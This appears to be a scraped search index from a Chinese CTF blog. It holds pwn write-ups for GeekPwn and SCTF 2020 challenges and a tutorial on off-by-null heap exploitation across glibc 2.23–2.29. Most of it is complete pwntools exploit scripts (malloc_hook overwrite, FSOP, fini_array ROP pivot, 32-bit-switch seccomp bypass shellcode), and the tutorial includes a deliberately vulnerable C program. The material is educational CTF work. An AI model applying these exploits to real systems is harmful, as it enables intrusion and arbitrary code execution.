p64(_IO_buf_base) + \\ p64(_IO_buf_end) + \\ p64(_IO_save_base) + \\ p64(_IO_backup_base) + \\ p64(_IO_save_end) + \\ p64(_IO_marker) + \\ p64(_IO_chain) + \\ p32(_fileno) struct = struct.ljust(0x88, \"\\x00\") struct += p64(_lock) struct = struct.ljust(0xc0,\"\\x00\") struct += p64(_mode) struct = struct.ljust(0xd8, \"\\x00\") return struct def exp(): sleep_addr=int(r(5),16) info_addr(\"sleep\",sleep_addr) #make chunk add(0,0x380,p64(0)+p64(0x1e1)+'\\x00'*0x1d0+ p64(0)+p64(0x21)+'\\x00'*0x10+ p64(0)+p64(0x91)+'\\x00'*0x80+ p64(0)+p64(0x21)+'\\x00'*0x10+ p64(0)+p64(0x91)+'\\x00'*0x80+ p64(0)+p64(0x21)+'\\x00'*0x10+ p64(0)+p64(0x21)+'\\x00'*0x10) delete(0x10) delete(0x210) delete(0x2c0) #make bk pwn_print() io_list_all=(((sleep_addr\u00260xf0)-0x70)\u003c\u003c8)+0x520 pack_io_list_all=struct.pack('\u003cI',io_list_all-0x10) add(0x140,0x1a,'/bin/sh\\x00'+p64(0x61)+p64(0)+pack_io_list_all[0]+pack_io_list_all[1]) add(0x160,0x10,p64(2)+p64(3)) system=(((sleep_addr\u00260xff0)-0x870)\u003c\u003c8)+0xa003a0 pack_system=struct.pack(\"\u003cI\",system) add(0x2b0,0x1b,p64(0)*3+pack_system[0]+pack_system[1]+pack_system[2]) choice(4) itr() exp() EasyShell 字符串漏洞，可以袭击fini_array来getshell。观察finish函数可以得知其会先执行0x6D6830地址储存的函数，再执行0x6D6828地址储存的函数。同时我们发现rbp的值为0x6ed0c0，如果将0x6D6830储存leave_ret的地址，就可以实现栈迁移，我们再利用字符串漏洞在0x6ed0c8处写下ROP链，由于我们只能输入0xc0大小的字符，不能一次性将ROP链写完，可以分两次来写，第一次写read，第二次再写ROW。OK，思路就是这样，不过再写EXP时，需要注意我们输入的字符长度仅有0xc0大小，所以在利用字符串漏洞来修改地址时，小值优先，这样可以尽可能的缩短字符串长度。 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() debug = lambda command='' :gdb.attach(sh,command) if args['REMOTE']: sh=remote() else: sh=process('./pwn') if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def exp(): fake_stack=0x6ed0c8 fini_array=0x6D6830 leave_ret=0x400DFC rdi_ret=0x401f0a rsi_ret=0x4014a","date":"2020-07-15","objectID":"/geekpwn-wp/:3:0","tags":["pwn","wp"],"title":"geekpwn-wp","uri":"/geekpwn-wp/"},{"categories":["ctf"],"content":"君子色而不淫，发乎情，止乎礼。 ——《诗经》 ","date":"2020-07-14","objectID":"/sctf-wp/:0:0","tags":["pwn","wp"],"title":"SCTF-WP","uri":"/sctf-wp/"},{"categories":["ctf"],"content":"snake 题目漏洞很简单，如果蛇死亡后的坐标在最右下角的话，那么死后留下的message将会有一个off by one漏洞，有了这个漏洞就不多说了，后面就都是套路了。 from pwn import * if args['REMOTE']: sh=remote('39.107.244.116',9999) else: sh=process('./snake') if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() gdba = lambda command='' :gdb.attach(sh,command) def choice(elect): sh.recvuntil('4.start name') sh.sendline(str(elect)) def add(index,size,content): choice(1) sh.recvuntil('?') sh.sendline(str(index)) ru('?') sl(str(size)) ru('?') sl(content) def get(index): choice(3) sh.recvuntil('?') sh.sendline(str(index)) def delete(index): choice(2) sh.recvuntil('?') sh.sendline(str(index)) def start(): choice(4) def down_to_end(): for i in range(35): sl('') def leave_words(words): ru('words:') if len(words)==0x4d: s(words) else: sl(words) ru('?') sl('n') libc=ELF('../libc-2.23.so') #begin ru('?') sl(str(0x30)) ru('name') sl('a') sl('') down_to_end() leave_words('a') add(1,0x60,'a') add(2,0x10,'b') start() down_to_end() #overflow leave_words('a'*0x4c+'\\xb1') delete(0) add(0,0x10,'') get(0) start() ru('name: ') libc_base=u64(ru(' ').replace(' ','').ljust(8,'\\x00'))-0x3c4c0a info_addr('libc',libc_base) malloc_hook=libc_base+libc.symbols['__malloc_hook'] realloc=libc_base+libc.symbols['realloc'] gadget=[0x45216,0x4526a,0xf02a4,0xf1147] #3,5,7 onegadget=libc_base+gadget[3] system=libc_base+libc.symbols['system'] free_hook=libc_base+libc.symbols['__free_hook'] setcontext=libc_base+libc.symbols['setcontext'] mprotect=libc_base+libc.symbols['mprotect'] info_addr('malloc_hook',malloc_hook) info_addr('realloc',realloc) info_addr('onegadget',onegadget) info_addr('system',system) info_addr('free_hook',free_hook) info_addr('setcontext',setcontext) down_to_end() leave_words('a') #get shell delete(1) add(1,0x40,p64(0)*3+p64(0x71)+p64(malloc_hook-0x23)) add(2,0x60,p64(0x604b70)) add(3,0x60,'\\x00'*0xb+p64(onegadget)+p64(onegadget)) sh.interactive() ","date":"2020-07-14","objectID":"/sctf-wp/:1:0","tags":["pwn","wp"],"title":"SCTF-WP","uri":"/sctf-wp/"},{"categories":["ctf"],"content":"CoolCode 这是一道考察shellcode编写的题目，刚好自己在这一部分比较薄弱，比赛中没有做出来，那么赛后就用这道题来学习一下shellcode编写方面的知识。 CTF中shellcode的编写最简单的就是没有限制任何系统调用，因此可以直接使用execve()来获得shell。 难一点的题目，会禁止execve()的调用，这个时候就可以通过ORW来获得flag。 更难一点的题目会对输入字符限制，比如限定在可打印字符范围内，再折磨人一点的话，会将其限定在字母和数字之中。而这个时候编写shellcode就需要很多技巧了，比如syscall不能使用，我们可以利用xor sub and inc dec这些运算操作动态的修改我们的shellcode。 最难的是什么呢，就是既限定了输入字符的范围，还禁止掉了open系统调用，这个时候我们常规的orw就无法使用了，这道题目就属于这个类型。 我们用seccomp查看一下可以使用哪些syscall。 line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000000 A = sys_number 0001: 0x15 0x04 0x00 0x00000001 if (A == write) goto 0006 0002: 0x15 0x03 0x00 0x00000000 if (A == read) goto 0006 0003: 0x15 0x02 0x00 0x00000009 if (A == mmap) goto 0006 0004: 0x15 0x01 0x00 0x00000005 if (A == fstat) goto 0006 0005: 0x06 0x00 0x00 0x00050005 return ERRNO(5) 0006: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0007: 0x06 0x00 0x00 0x00000000 return KILL 可以看到open函数没有在允许的调用中，其中出现了一个奇怪的调用函数，fstat，这个究竟有什么用呢？如果比较一下64位下的fstat和32位下的open，你会发现他们俩的系统调用号是一样的。如果我们可以转换到32位，那不就可以使用open函数了吗？如何从64位转换到32位呢？这里就需要用到一条汇编指令retqf。程序究竟是64位还是32位是看cs寄存器的值，如果cs寄存器的值是0x23那么就是32位，如果是0x33，那么就是64位。retqf语句等于ret ；pop cs；所以其会将[rsp+8]处的值赋值给cs。因此我们就可以利用这条语句来修改程序的位数。 这道题因为可以将exit函数修改为ret，所以可以bypass掉字符限制。如果不修改exit的话，那么就需要用mmap来分配一个在字符限制内的地址。 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() debug = lambda command='' :gdb.attach(sh,command) if args['REMOTE']: sh=remote() else: sh=process('./CoolCode') # if args['I386']: # context.arch='i386' # else: # context.arch='amd64' if args['DEBUG']: context.log_level='debug' context.os='linux' def choice(elect): ru(':') sl(str(elect)) def add(index,message): choice(1) ru(':') sl(str(index)) ru(':') s(message) def show(index): choice(2) ru(':') sl(str(index)) def delete(index): choice(3) ru(':') sl(str(index)) #debug('b*0x0000000000400850\\nc') bss=0x602200 add(-22,'\\xc3') read=''' xor eax,eax xor edi,edi mov rsi,0x01010101 xor rsi,0x1612301 push 0x01010101 pop rdx syscall mov rsp,rsi retfq ''' print len(asm(read,arch='amd64')) open_flag=''' mov esp,0x602300 push 0x6761 push 0x6c662f2e mov eax,5 mov ebx,esp xor ecx,ecx int 0x80 ''' read_write=''' push 0x33 push 0x602233 retfq mov rdi,3 mov rsi,rsp mov rdx,0x100 xor rax,rax syscall mov rdi,1 mov rax,1 syscall ''' add(-37,asm(read,arch='amd64')) delete(0) s(p64(0x602210)+p64(0x23)+asm(open_flag,arch='i386')+asm(read_write,arch='amd64')) itr() ","date":"2020-07-14","objectID":"/sctf-wp/:2:0","tags":["pwn","wp"],"title":"SCTF-WP","uri":"/sctf-wp/"},{"categories":["ctf"],"content":"reference shellcode 的艺术 SCTF 2020 PWN ","date":"2020-07-14","objectID":"/sctf-wp/:2:1","tags":["pwn","wp"],"title":"SCTF-WP","uri":"/sctf-wp/"},{"categories":["ctf","knowledge"],"content":"夏天的风，我永远记得，清清楚楚的说你爱我。 ——《夏天的风》 前言 off by null是堆块中十分容易出现的一种漏洞，在ctf中十分的常见。off by null漏洞就是堆块可以向下一个堆块溢出一个字节的数据，而该数据为\\x00，这与溢出任意一个字节的数据是由区别的。如果是溢出任意一个字节，那么就可以修改下一个堆块的大小，而off by null则不能，它仅仅只可以将下一个堆块的inuse位置零，进而在free时发生堆块合并，进而overlapping来实现进一步的攻击。在堆块合并时，会进行unlink来取出要合并的chunk，所以想要利用off by null，我们还需要绕过unlink的保护。libc2.29中新增了对堆块合并的检测所以其利用机制和libc-2.27和libc-2.23有所区别，2.27与2.23基本没有太大的区别，只需要将tcache填满即可，不过里面依然有几点需要我们注意的，这将会在后面讲诉。 所以让我们先从2.23版本的libc讲起，再进入2.27，最后讲解最复杂的2.29。 libc2.23的利用 首先我们来介绍一下2.23版本下off by null的利用方法，然后用一道例题实战巩固一下。 我们先分配四个堆块A，B，C，D，其大小分别是0x90，0x20，0x100，0x20。在堆中的排列如下。（ps：我们知道堆块size的最低3位有特殊意义，最低位代表pre_inuse，其值为1时代表上一个堆块正在使用，为0时代表上一个堆块未使用被free掉，而off by null正是利用这一点，将最低位的pre_inuse溢出为0进而发生堆块合并。 A堆块的作用是构造满足unlink条件的堆块。当其释放时，将会放入unsortedbin堆块中，而unsorted bin堆块会给A堆块的fd，bk字段赋值为unsorted bin表头地址，进而可以通过验证。 B堆块的作用是利用off by null漏洞，修改下一个堆块的pre_inuse位为零。这里B堆块的大小可以根据需要来改变，当我们发生堆块合并后，B堆块将会被释放，进而就有了一个UAF漏洞可以利用。 C堆块的作用是发生堆块合并，使ABC三个堆块共同合并成一个堆块释放到bin中。当C堆块的pre_inuse位修改位零时，释放C堆块就会发生向前合并。注意因为off by null会修改C堆块size位的最低字节位零，所以C块的大小要向0x100对齐，如果是0x120的话，那么就会修改其大小为0x100，这样在堆块释放时将会发生错误。 D堆块的作用时防止合并后的堆块与Top chunk合并。 我们现在来看看当我们释放C堆块时究竟发生了什么（如果对于libc的堆块管理不是很清楚的朋友，可以看一看我之前写过的不同版本glibc的堆管理和新增保护机制)，这里我们只选择相关的关键部分讨论。） 当我们释放C堆块时，所以会检测其大小是否在fastbin堆块的范围内，如果不在且不是map分配的就会进行下面的安全检测。（以下代码来至libc2.23 /* Lightweight tests: check whether the block is already the top block. */ if (__glibc_unlikely (p == av-\u003etop)) malloc_printerr (\"double free or corruption (top)\"); /* Or whether the next chunk is beyond the boundaries of the arena. */ if (__builtin_expect (contiguous (av) \u0026\u0026 (char *) nextchunk \u003e= ((char *) av-\u003etop + chunksize(av-\u003etop)), 0)) malloc_printerr (\"double free or corruption (out)\"); /* Or whether the block is actually not marked used. */ if (__glibc_unlikely (!prev_inuse(nextchunk))) malloc_printerr (\"double free or corruption (!prev)\"); nextsize = chunksize(nextchunk); if (__builtin_expect (chunksize_nomask (nextchunk) \u003c= 2 * SIZE_SZ, 0) || __builtin_expect (nextsize \u003e= av-\u003esystem_mem, 0)) malloc_printerr (\"free(): invalid next size (normal)\"); 第一个if检测当前要释放的堆块是否等于TOPchunk。 第二个if检测下一个chunk是否在堆块地址范围内。 第三个if检测下一个chunk的pre_inuse位是否为1。 第四个if检测下一个chunk的大小是否满足要求。 Obviously，我们构造的堆块C满足上面的四个条件。（如果C的地址不是0x100对齐的话，那么2，3，4检测都可能出错）。 ok，通过上面的检测后，下面就来到我们讨论的重点了。 /* consolidate backward */ if (!prev_inuse(p)) { prevsize = prev_size (p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd); } 首先检测堆块的prev_inuse位，如果prev_inuse位为零的话就会向后合并。那么究竟要向后合并多少字节的堆块呢？这个由prevsize位给出。根据prevsize位的大小，计算出待合并的chunk，将该chunk从双向链表中unlink出来，然后与该堆块合并构成一个新的堆块。 所以如果我们修改prev_inuse位，并且修改后计算出来的待合并chunk满足unlink的条件的话，我们就可以实现堆块的overlapping。 根据这个思路，我们修改C堆块的prev_inuse位为0xB0，那么在堆块合并时，根据prev_inuse位我们计算出待合并的堆块地是A，合并后的size大小是0x150，这样只要A堆块满足unlink的条件，我们就完成了ABC堆块的合并，进而可以利用UAF漏洞。这里我们再大致看一看unlink的内容。 #define unlink(AV, P, BK, FD) { \\ if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\ malloc_printerr (\"corrupted size vs. prev_size\"); \\ FD = P-\u003efd; \\ BK = P-\u003ebk; \\ if (__builtin_expect (FD-\u003ebk != P || BK-\u003efd != P, 0)) \\ malloc_printerr (\"corrupted double-linked list\"); \\ else { \\ FD-\u003ebk = BK; \\ BK-\u003efd = FD; \\ if (!in_smallbin_range (chunksize_nomask (P)) \\ \u0026\u0026 __builtin_expect (P-\u003efd_nextsize != NULL, 0)) { \\ if (__builtin_expect (P-\u003efd_nextsize-\u003ebk_nextsize != P, 0) \\ || __builtin_expect (P-\u003ebk_nextsize-\u003efd_nextsize != P, 0)) \\ malloc_printerr (\"corrupted double-linked list (not small)\"); \\ if (FD-\u003efd_nextsize == NULL) { \\ if (P-\u003efd_nextsize == P) \\ FD-\u003efd_nextsize = FD-\u003ebk_nextsize = FD; \\ else { \\ FD-\u003efd_nextsize = P-\u003efd_nextsize; \\ FD-\u003ebk_nextsize = P-\u003ebk_nextsize; \\ P-\u003efd_nextsize-\u003ebk_nextsize = FD; \\ P-\u003ebk_nextsize-\u003efd_nextsize = FD; \\ } \\ } else { \\ P-\u003efd_nextsize-\u003ebk_nextsize = P-\u003ebk_nextsize; \\ P-\u003ebk_nextsize-\u003efd_nextsize = P-\u003efd_nextsize; \\ } \\ } \\ } \\ } unlink首先会检擦该chunk的prev_size与size位是否匹配，然后就是我们熟悉的双向链表检验过程。显然，A堆块是我们正常释放的堆块，且其在unsorted bin堆块中，所以这些检查都能通过。 ok，关于libc-2.23的利用原理介绍到这里就告一段落了，这里概括一下攻击步骤。 分配ABCD，四个堆块。 释放A堆块放入unsortedbin中。 利用B堆块修改C堆块的prev_size大小和prev_inuse位。 释","date":"2020-07-13","objectID":"/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/:0:0","tags":["pwn"],"title":"off by null利用总结","uri":"/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"},{"categories":["ctf","knowledge"],"content":"例题 这里我就不在网上去找例题了，我们现写一道简单的有off by null漏洞的菜单题来运用刚才学到的知识。 #include\u003cstdio.h\u003estruct chunk{ long *point; unsigned int size; }chunks[10]; void add() { unsigned int index=0; unsigned int size=0; puts(\"Index?\"); scanf(\"%d\",\u0026index); if(index\u003e=10) { puts(\"wrong index!\"); exit(0); } puts(\"Size?\"); scanf(\"%d\",\u0026size); chunks[index].point=malloc(size); if(!chunks[index].point) { puts(\"malloc error!\"); exit(0); } chunks[index].size=size; } void show() { unsigned int index=0; puts(\"Index?\"); scanf(\"%d\",\u0026index); if(index\u003e=10) { puts(\"wrong index!\"); exit(0); } if(!chunks[index].point) { puts(\"It's blank!\"); exit(0); } puts(chunks[index].point); } void edit() { unsigned int index; puts(\"Index?\"); scanf(\"%d\",\u0026index); if(index\u003e=10) { puts(\"wrong index!\"); exit(0); } if(!chunks[index].point) { puts(\"It's blank!\"); exit(0); } char *p=chunks[index].point; puts(\"content:\"); p[read(0,chunks[index].point,chunks[index].size)]=0; } void delete() { unsigned int index; puts(\"Index?\"); scanf(\"%d\",\u0026index); if(index\u003e=10) { puts(\"wrong index!\"); exit(0); } if(!chunks[index].point) { puts(\"It's blank!\"); exit(0); } free(chunks[index].point); chunks[index].point=0; chunks[index].size=0; } void menu() { puts(\"1) add a chunk\"); puts(\"2) show content\"); puts(\"3) edit a chunk\"); puts(\"4) delete a chunk\"); putchar('\u003e'); } void main() { unsigned int choice; puts(\"Welcome to my off by null vuln vulnerability exercise.\"); puts(\"wish you will play happy!\"); while(1) { menu(); scanf(\"%d\",\u0026choice); switch(choice) { case 1: add(); break; case 2: show(); break; case 3: edit(); break; case 4: delete(); break; default: exit(0); } } } 在edit函数出p[read(0,chunks[index].point,chunks[index].size)]=0;这句语句造成了off by null漏洞。本意是想将输入的最后一个字符替换成0，但是read函数返回的是读入的字符数，而数组是从0开始标记的，所以如果我们读入了size个字符那么就会修改第size+1处的值为0。 我们用gcc -fPIE -pie -z now -o vuln off_by_one.c来开启全部保护。OK现在我们就开始写EXP了，按照我们上面介绍的利用思路，我们需要分配ABCD四个堆块，这里为了配合之后的fast bin attack，我们将B堆块的大小修改为0x70。 add(0,0x80) #A,0 add(1,0x68) #B,1 add(2,0xf0) #C,2 add(3,0x10) #D,3 图中表明了ABC三个堆块在堆中的相对位置，这里就不标记D了，因为D堆块只是起一个防止堆块和TOP chunk合并的作用，在漏洞利用时没有用处。 OK我们继续之前分析的步骤，释放A堆块，并修改C堆块的prev_size和prev_inuse位，我们计算一下可以得到prev_size=0x70+0x90=0x100。 A堆块被释放到了unsorted bin中，由图中红笔画出的两个地方，刚好可以bypass unlink的检验，下面我们再来看看C堆块的prev_size和prev_inuse位。 从图中可以看出，我们成功的将C堆块的prev_size和rev_inuse修改为我们想要的值，接下来让我们free掉C堆块，看看会发生什么。 可以看到C堆块和前面的堆块发生合并生产了一个0x200大小的chunk，而B堆块被包含在其中，这个时候我们就实现了堆块overlapping。OK，off by null的漏洞我们以及利用成功了，接下来就是泄漏libc地址，然后进行fast bin attack袭击malloc_hook 接下来的步骤我就直接阐述了，因为这不涉及off by null了。 首先我们分配0x80大小的chunk这样，将会分割0x200的堆块，然后unsorted bin的地址就会放在我们B对堆块上。 然后显示B堆块的内容，我们就获得了libc的地址 然后再添加0x68大小的chunk，这样我们就拥有两个Bchunk，随后就可以展开fast bin attack。 我们再释放掉其中一个B堆块 再用另外一个堆块修改fd的值为malloc_hook-0x23 最后修改malloc_hook为realloc，realloc_hook为onegadget从而获得shell 下面是EXP #Author: Nopnoping from pwn import * from LibcSearcher import * if args['REMOTE']: sh=remote() else: sh=process('./vuln') if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() gdba = lambda command='' :gdb.attach(sh,command) def choice(elect): sh.recvuntil('\u003e') sh.sendline(str(elect)) def add(index,size): choice(1) sh.recvuntil('?') sh.sendline(str(index)) sh.recvuntil('?') sh.sendline(str(size)) def edit(index,content,full=False): choice(3) sh.recvuntil('?') sh.sendline(str(index)) sh.recvuntil(':') if full: s(content) else: sh.sendline(content) def show(index): choice(2) sh.recvuntil('?') sh.sendline(str(index)) def delete(index): choice(4) sh.recvuntil('?') sh.sendline(str(index)) libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') add(0,0x80) #A,0 add(1,0x68) #B,1 add(2,0xf0) #C,2 ad","date":"2020-07-13","objectID":"/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/:1:0","tags":["pwn"],"title":"off by null利用总结","uri":"/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"},{"categories":["ctf","knowledge"],"content":"例题 我们还是利用2.23的程序来练习2.27版本下的利用。这里因为我是在ubuntu16系统下运行的程序，其默认版本是libc2.23，因此我需要更改一下程序的libc版本。需要用到的工具是patchelf，在这篇博客我有对这个工具详细的一个介绍。修改程序为指定libc版本 \u0026 pwndbg安装。如果用的是ubuntu18的朋友可以直接跳到EXP编写的部分。 我们先用ldd看一下这个程序的libc和ld。 可以看到程序的libc版本和ld依赖的文件，我们现在利用patchelf工具将其修改为2.27的libc和ld。 $ patchelf --replace-needed libc.so.6 /glibc/2.27/amd64/lib/libc-2.27.so vuln $ patchelf --set-interpreter /glibc/2.27/amd64/lib/ld-2.27.so ./vuln $ ldd ldd vuln linux-vdso.so.1 =\u003e (0x00007ffd38345000) /glibc/2.27/amd64/lib/libc-2.27.so (0x00007fcf76185000) /glibc/2.27/amd64/lib/ld-2.27.so =\u003e /lib64/ld-linux-x86-64.so.2 (0x00007fcf7673d000) 用patchelf工具修改后，我们再次用ldd查看程序，libc和ld成功被我们修改为2.27。 OK现在我们可以开始编，写我们的EXP了。按照前面分析的思路，我们首先需要将0x90和0x1b0两个堆块填满。当tcache被填满后再申请堆块的话，将会从tcahe里面分配，这样分配到的ABC可能并不连续，所以我们先提前将ABC三个堆块分配好，再填满0x90和0x1b。因为又tcache来分隔C堆块和TOP chunk，所以这里我们就不需要D堆块了。 add(0,0x80) #A add(1,0x18) #B add(2,0xf0) #C for i in range(7): add(i+3,0x80) for i in range(7): delete(i+3) add(i+3,0xf0) for i in range(7): delete(i+3) 现在让我们来释放A堆块，并用B堆块修改C堆块的大小。 接下来我们释放C堆块，然后C堆块将会和AB堆块发生合并。（这里的检测机制和2.23一样我就不赘述了） OK成功合并，off by null漏洞利用成功，接下来的就是获取Shell了，思路和2.23一样。 分配0x80大小堆块，将unsorted bin的地址放入B堆块中。（这里需要先将tcache中的堆块分配完） 泄漏libc地址 再分配0x20大小堆块，从而有两个B堆块 释放其中一个修改fd为realloc_hook 修改malloc_hook为realloc，realloc_hook为onegadget从而获得shell from pwn import * from LibcSearcher import * if args['REMOTE']: sh=remote() else: sh=process('./vuln') if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() gdba = lambda command='' :gdb.attach(sh,command) def choice(elect): sh.recvuntil('\u003e') sh.sendline(str(elect)) def add(index,size): choice(1) sh.recvuntil('?') sh.sendline(str(index)) sh.recvuntil('?') sh.sendline(str(size)) def edit(index,content,full=False): choice(3) sh.recvuntil('?') sh.sendline(str(index)) sh.recvuntil(':') if full: s(content) else: sh.sendline(content) def show(index): choice(2) sh.recvuntil('?') sh.sendline(str(index)) def delete(index): choice(4) sh.recvuntil('?') sh.sendline(str(index)) libc=ELF('/glibc/2.27/amd64/lib/libc-2.27.so') add(0,0x80) #A add(1,0x18) #B add(2,0xf0) #C for i in range(7): add(i+3,0x80) for i in range(7): delete(i+3) add(i+3,0xf0) for i in range(7): delete(i+3) delete(0) edit(1,'\\x00'*0x10+p64(0xb0),full=True) delete(2) for i in range(8): add(3,0x80) show(1) ru('\\n') libc_base=u64(ru('\\n').replace('\\n','').ljust(8,'\\x00'))-0x3afca0 malloc_hook=libc_base+libc.symbols['__malloc_hook'] realloc=libc_base+libc.symbols['realloc'] gadget=[0x41666,0xdeed2] onegadget=libc_base+gadget[1] info_addr('libc_base',libc_base) info_addr(\"malloc_hook\",malloc_hook) info_addr(\"onegadget\",onegadget) add(2,0x10) delete(2) edit(1,p64(malloc_hook-0x8)) add(3,0x10) add(4,0x18) edit(4,p64(onegadget)+p64(realloc+2)) add(1,0x10) sh.interactive() libc2.29的利用 在libc2.29中，对向前合并操作，增加了保护机制。究竟是什么保护呢，我们一起来看看libc2.29的源代码。 /* consolidate backward */ if (!prev_inuse(p)) { prevsize = prev_size (p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); if (__glibc_unlikely (chunksize(p) != prevsize)) malloc_printerr (\"corrupted size vs. prev_size while consolidating\"); unlink_chunk (av, p); } 相对于2.27和2.23版本的libc，2.29版本增加了一条if判断。其会检测prev_size和p堆块的size是否相等。p堆块是什么堆块呢？是根据prevsize的值而计算出来的上一个堆块。用我们上面举的ABCD堆块的例子来说，这里的p堆块就是A堆块，而A堆块的size值是0x90，很明显和我们将要修改的prevsize值是不相等的，prevsize的值是A+B。所以如果按照2.23和2.27的做法来做的话，将不能绕过这个检验。 那我们应该怎么做？我们之前绕过利用了unsorted bin留下的数据，同样2.29的off by null也是充分利用bin留下的数据来操控的。具体利用了large bin，small bin，fast bin。 接下来，我们先总体看一看利用思路，再分析思路原理和一些细节。 将heap的地址第二字节大小提高到0x00 分配一个很大的chunk，这个chunk的大小要在largebin范围内并且大于tcache的最大值。（我们将这个chunk命名为A） 释放A堆块，再分配一个","date":"2020-07-13","objectID":"/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/:2:0","tags":["pwn"],"title":"off by null利用总结","uri":"/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"},{"categories":["ctf","knowledge"],"content":"例题 例题还是用前面的例子，不过我们需要用patchelf将libc和ld的版本换成2.29的，方法同2.27。 $ patchelf --replace-needed /glibc/2.27/amd64/lib/libc-2.27.so /glibc/2.29/amd64/lib/libc-2.29.so ./vuln $ patchelf --set-interpreter /glibc/2.29/amd64/lib/ld-2.29.so ./vuln $ ldd vuln linux-vdso.so.1 =\u003e (0x00007fff2afe1000) /glibc/2.29/amd64/lib/libc-2.29.so (0x00007f6c8ff74000) /glibc/2.29/amd64/lib/ld-2.29.so =\u003e /lib64/ld-linux-x86-64.so.2 (0x00007f6c90530000) 按照我们的思路首先我们需要将地址提高到第二字节为0。我们这里先关闭ASLR来编写EXP。 gdb观察到，第一个分配的堆块地址是0x555555758670，所以如果我们想要将堆块地址提高到0x555555760000，我们需要添加0x7990大小的chunk。这里从0x7990中拿出来7个0x30大小的chunk，用于后面填满tcache。 然后我们分配一个0x500大小的chunkA，并分配一个0x20大小的chunk来分隔A和TOPchunk。A堆块分配完成后，我们再释放A，申请一个比A大的chunk，这里我们申请0x600来使A堆块进入large bin。 按照上面的思路，我们再从A堆块中分隔出BCD堆块，注意在实际应用中C，D，A堆块不能相邻，否在在申请一个较大堆块时，发生malloc_consolidate，CDA将会合并 这里把B堆块的bk和fd_size改成consolidate_size和C堆块的地址。consolidate_size是根据后面需要合并的堆块大小计算出来的，在这里可以先不写出，待后面分配完了后再修改。 然后我们用前面准备的7个0x30大小的chunk填满tcache，再释放C和D，并申请一个大的chunk使得C和D进入small bin。注意这里为了防止D堆块和A堆块合并，我们在申请一个大的对快前，提前将E堆块申请了。 然后我们申请出C堆块，将bk修改为B+0x10. 下一步我们将B堆块和D堆块放入fast bin中然后修改B堆块的fd为B+0x10 到这里我们就完成了堆块的构造，后面就很简单了，我们再从A堆块中分割出E和F，然后用E来修改F的prev_size和in_use。 接下来我们需要先申请7个0x100大小的chunk，来填满tcache，再释放F堆块发生堆块合并。 发生堆块合并后，思路就和前面一样了，这里就不再重复了，直接看EXP。 from pwn import * from LibcSearcher import * if args['REMOTE']: sh=remote() else: sh=process('./vuln') if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() debug = lambda command='' :gdb.attach(sh,command) def choice(elect): sh.recvuntil('\u003e') sh.sendline(str(elect)) def add(index,size): choice(1) sh.recvuntil('?') sh.sendline(str(index)) sh.recvuntil('?') sh.sendline(str(size)) def edit(index,content,full=False): choice(3) sh.recvuntil('?') sh.sendline(str(index)) sh.recvuntil(':') if full: s(content) else: sh.sendline(content) libc=ELF('/glibc/2.29/amd64/lib/libc-2.29.so') def show(index): choice(2) sh.recvuntil('?') sh.sendline(str(index)) def delete(index): choice(4) sh.recvuntil('?') 